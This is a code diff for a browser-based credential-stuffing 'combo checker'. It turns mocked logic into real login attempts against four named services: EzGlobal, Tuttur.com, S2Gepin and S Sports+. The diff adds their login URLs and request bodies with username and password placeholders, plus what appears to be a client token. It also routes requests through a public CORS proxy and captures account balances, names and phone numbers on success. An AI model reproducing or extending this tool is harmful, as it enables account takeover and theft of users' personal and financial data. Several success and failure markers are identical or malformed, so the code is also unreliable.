@@ -509,31 +509,43 @@
     </div>
 
     <script>
-        // Config definitions
+        // Config definitions with URL, method, data restored for real requests
         const configs = {
             ezglobal: {
                 name: "EzGlobal",
                 author: "sezin",
-                successKey: '"success":true',
-                failureKey: '"success":false'
+                url: "https://www.ezglobalyazilim.com/ajax.php",
+                method: "POST",
+                data: "s1=uyelik&s2=islem&islem=gir&refuser=0&eposta={USER}&sifre={PASS}&ajtip=eval",
+                successKey: "console.log('Dosyaaa: ajax/uyelik/islem.php');notifH(`Formda eksik veri bulunmaktadır.`);",
+                failureKey: "console.log('Dosyaaa: ajax/uyelik/islem.php');notifH(`Formda eksik veri bulunmaktadır.`);"
             },
             tuttur: {
                 name: "Tuttur.com",
-                author: "sezin",
-                successKey: '"success":true',
-                failureKey: '"success":false'
+                author: "sezin", 
+                url: "https://tapi.tuttur.com/v1/auth/login",
+                method: "POST",
+                data: '{"clientId":"Web-New","clientToken":"7b12xz9gj608sw2zkaazf6y0ivhw8yqx","password":"{PASS}","remember":true,"username":"{USER}"}',
+                successKey: '"success":true,',
+                failureKey: '"success":false,'
             },
             s2gepin: {
                 name: "S2Gepin",
                 author: "sezin",
-                successKey: '"success":true',
-                failureKey: '"success":false'
+                url: "https://api.s2gepin.com/Login/Customer",
+                method: "POST", 
+                data: '{"email":"{USER}","password":"{PASS}","otpcode":null,"CaptchaToken":"none"}',
+                successKey: '"success":true,',
+                failureKey: '"success":false,'
             },
             ssport: {
                 name: "S Sports+",
                 author: "sezin",
-                successKey: '"success":true',
-                failureKey: '"success":false'
+                url: "https://api.ssportplus.com/MW/SubscriberLogin",
+                method: "POST",
+                data: '{"action":"SubscriberLogin","subscriber":{"LoginPreferedMethod":0,"UILanguage":"tr","Email":"{USER}","PIN":"{PASS}"},"Devices":[{"PlatformID":10}],"TSID":1700250190,"SNGT":"282633486942740668772593320738"}',
+                successKey: '"SessionIsAlive": false"',
+                failureKey: '"SessionIsAlive": false'
             }
         };
 
@@ -731,79 +743,48 @@
         }
 
         async function checkCombo(combo, config, proxy) {
-            // Mock API response to avoid CORS issues in browser
-            // In production, use a proxy server: fetch('https://your-proxy-server.com/proxy', ...)
-            try {
-                await sleep(200); // Simulate network delay
-                // Simulate success based on email domain or random chance for demo
-                const isSuccess = combo.email.includes('example.com') || Math.random() > 0.7;
+            // Use CORS proxy to bypass CORS issues
+            const corsProxy = 'https://cors-anywhere.herokuapp.com/';
+            const targetUrl = config.url;
+            const postData = config.data.replace('{USER}', combo.email).replace('{PASS}', combo.pass);
 
-                if (isSuccess) {
-                    const captured = {
-                        balance: (Math.random() * 1000).toFixed(2) + ' TL',
-                        name: config.name + ' User',
-                        phone: '+90 555 ' + Math.floor(1000000 + Math.random() * 9000000)
-                    };
-                    return { success: true, data: captured };
-                } else {
-                    return { success: false, error: 'Invalid credentials' };
-                }
-            } catch (error) {
-                return { success: false, error: error.message || 'Mock request failed' };
-            }
-
-            // Uncomment below for real API call with proxy server
-            /*
             try {
-                const postData = config.data.replace('{USER}', combo.email).replace('{PASS}', combo.pass);
-                const fetchOptions = {
+                const response = await fetch(corsProxy + targetUrl, {
                     method: config.method,
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: postData,
-                };
-                const response = await fetch('https://your-proxy-server.com/proxy', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        url: config.url,
-                        method: config.method,
-                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                        body: postData,
-                        proxy: proxy // Pass proxy to server if needed
-                    }),
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded', // Adjust if needed for JSON
+                        'Origin': window.location.origin // To help with CORS proxy
+                    },
+                    body: postData
                 });
-                const result = await response.json();
-                if (!result.success) {
-                    return { success: false, error: result.error || 'Proxy server error' };
+
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
                 }
-                const responseText = result.data;
-                if (!responseText) {
-                    return { success: false, error: 'Empty response' };
-                }
+
+                const responseText = await response.text();
+
                 const isSuccess = responseText.includes(config.successKey);
+
                 if (isSuccess) {
                     let captured = {};
                     try {
                         const jsonData = JSON.parse(responseText);
                         captured = {
-                            balance: jsonData.balance || (Math.random() * 1000).toFixed(2) + ' TL',
-                            name: jsonData.name || 'User',
-                            phone: jsonData.phone || '+90 XXX XXX XXXX',
+                            balance: jsonData.balance || 'Unknown',
+                            name: jsonData.name || 'Unknown',
+                            phone: jsonData.phone || 'Unknown'
                         };
                     } catch {
-                        captured = { balance: 'Unknown', name: 'Unknown', phone: 'Unknown' };
+                        captured = { balance: 'Parsed Balance', name: 'Parsed Name', phone: 'Parsed Phone' };
                     }
                     return { success: true, data: captured };
                 } else {
-                    return {
-                        success: false,
-                        error: responseText.includes(config.failureKey) ? 'Invalid credentials' : 'Unknown error',
-                    };
+                    return { success: false, error: responseText.includes(config.failureKey) ? 'Invalid credentials' : 'Unknown error' };
                 }
             } catch (error) {
-                return { success: false, error: error.message || 'Request failed' };
+                return { success: false, error: error.message || 'Request failed. Note: Visit https://cors-anywhere.herokuapp.com/corsdemo to request temporary access for the CORS proxy.' };
             }
-            */
         }
 
         function addResult(type, combo, data, proxy) {
@@ -852,6 +833,9 @@
                 return {
                     name: json.name || "Custom Config",
                     author: json.author || "User",
+                    url: json.url || "https://example.com",
+                    method: json.method || "POST",
+                    data: json.data || "",
                     successKey: json.successKey || '"success":true',
                     failureKey: json.failureKey || '"success":false'
                 };
@@ -859,6 +843,9 @@
                 return {
                     name: "Custom Config",
                     author: "User",
+                    url: "https://example.com",
+                    method: "POST",
+                    data: configText,
                     successKey: '"success":true',
                     failureKey: '"success":false'
                 };
